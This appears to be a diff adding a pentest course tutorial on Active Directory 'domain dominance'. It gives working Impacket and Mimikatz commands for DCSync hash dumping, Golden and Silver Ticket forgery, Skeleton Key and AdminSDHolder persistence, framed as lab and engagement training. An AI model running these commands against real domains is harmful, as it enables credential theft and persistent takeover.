@@ -1,0 +1,127 @@
+---
+title: "Tut05: Domain Dominance"
+---
+
+Domain dominance is the end goal of an Active Directory engagement: control over the entire domain in a way that is persistent, complete, and documented. Once you reach this stage, you can demonstrate the full impact of the compromise to the client and show what a real attacker could do with this level of access.
+
+## DCSync
+
+DCSync mimics the behavior of a Domain Controller replicating with another DC. With the right privileges (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`), you can pull every password hash from the domain—including the KRBTGT account—without touching the DC directly.
+
+### From Linux (Impacket)
+
+```sh
+# Dump all hashes from the domain
+impacket-secretsdump corp.local/administrator:'Password123'@dc01.corp.local
+
+# Or with hash
+impacket-secretsdump corp.local/administrator@dc01.corp.local -hashes :64f12cddaa88057e06a81b54e73b949b
+
+# Dump a specific user
+impacket-secretsdump corp.local/administrator:'Password123'@dc01.corp.local -just-dc-user krbtgt
+```
+
+Output example:
+
+```
+corp.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+corp.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:310b643c5316c8c3970a1dfe8e8cb50b:::
+```
+
+### From Windows (Mimikatz)
+
+```powershell
+lsadump::dcsync /user:krbtgt
+lsadump::dcsync /all /csv
+```
+
+## Golden Ticket
+
+The KRBTGT account's hash is the cryptographic root of Kerberos in the domain. With it, you can forge a Ticket Granting Ticket (TGT) for any user—including accounts that do not exist—valid for any service.
+
+A forged TGT is called a **Golden Ticket**.
+
+### Creating a Golden Ticket (Mimikatz)
+
+```powershell
+# Collect the required values
+# Domain SID: Get-DomainSID (PowerView) or whoami /user
+# KRBTGT hash: from DCSync output
+
+kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:310b643c5316c8c3970a1dfe8e8cb50b /ptt
+```
+
+Parameters:
+- `/user` — the username to embed (can be anything)
+- `/domain` — the domain FQDN
+- `/sid` — the domain SID (without the RID)
+- `/krbtgt` — the KRBTGT NTLM hash
+- `/ptt` — pass the ticket to current session immediately
+
+### Creating a Golden Ticket (Impacket, from Linux)
+
+```sh
+impacket-ticketer -nthash 310b643c5316c8c3970a1dfe8e8cb50b -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain corp.local FakeAdmin
+
+export KRB5CCNAME=FakeAdmin.ccache
+impacket-psexec corp.local/FakeAdmin@dc01.corp.local -k -no-pass
+```
+
+A Golden Ticket remains valid until the KRBTGT hash is rotated—which organizations must do **twice** to invalidate all existing tickets.
+
+## Silver Ticket
+
+A Silver Ticket is a forged TGS (service ticket) for a specific service. It does not require the KRBTGT hash—only the service account's hash. It is harder to detect because it never touches the DC.
+
+```powershell
+# Forge a TGS for the CIFS service on a file server
+kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:fileserver.corp.local /service:cifs /rc4:<fileserver_machine_hash> /ptt
+```
+
+## Persistence: Skeleton Key
+
+Skeleton Key patches the LSASS process on a Domain Controller to accept a master password for any account, while the real password continues to work.
+
+```powershell
+# On the DC
+misc::skeleton
+```
+
+Now any account can be authenticated with the master password `mimikatz` in addition to their real password. This is dangerous and will crash LSASS if patched incorrectly—only demonstrate in a lab.
+
+## Persistence: AdminSDHolder
+
+AdminSDHolder is an AD object whose ACL is periodically propagated to all protected groups (Domain Admins, etc.) by the `SDPropagator` process (runs every 60 minutes).
+
+If you add an ACE to AdminSDHolder, it will be applied to every privileged group automatically:
+
+```powershell
+# Grant your user GenericAll on AdminSDHolder
+Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity your.user -Rights All
+```
+
+Within an hour, `your.user` will have GenericAll over Domain Admins, allowing you to re-add yourself even after being removed.
+
+## Documenting Full Domain Compromise
+
+A complete report from this stage includes:
+
+1. The initial foothold and how it was achieved.
+2. Each lateral movement step with the host name, technique, and credentials used.
+3. The privilege escalation path to Domain Admin.
+4. Evidence of DCSync: the KRBTGT hash (or a sanitized indicator).
+5. A Golden Ticket demonstration: authentication as a non-existent account.
+6. Persistence mechanism used.
+7. All systems accessed and data that could have been reached.
+8. Recommended mitigations for each finding.
+
+## Task
+
+> **[Task]** In your lab, perform DCSync to extract the KRBTGT hash. Create a Golden Ticket for a user of your choice. Authenticate to the Domain Controller using the Golden Ticket and confirm Domain Admin access. Document the full attack chain from initial access to Golden Ticket with evidence at each step.
+
+## Reference
+
+- [ired.team - DCSync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
+- [ired.team - Golden Ticket](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
+- [Mimikatz Golden Ticket](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos)
+- [HackTricks - Domain Persistence](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)
